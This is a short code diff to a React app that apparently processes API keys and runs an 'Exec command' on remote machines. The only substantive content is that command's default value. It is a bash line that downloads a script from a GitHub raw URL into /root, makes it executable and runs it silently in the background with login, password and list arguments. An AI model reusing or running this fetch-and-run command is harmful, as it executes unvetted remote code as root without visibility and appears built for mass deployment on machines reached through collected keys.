@@ -417,7 +417,7 @@ function App() {
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\\ncd /root\\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
+            <input type="text" ref={$exec} className="form-control mb-1" defaultValue={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &'} />
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
@@ -467,7 +467,6 @@ function App() {
             </div>
           ))}
         </>}
-
       </>
     </div>
   );
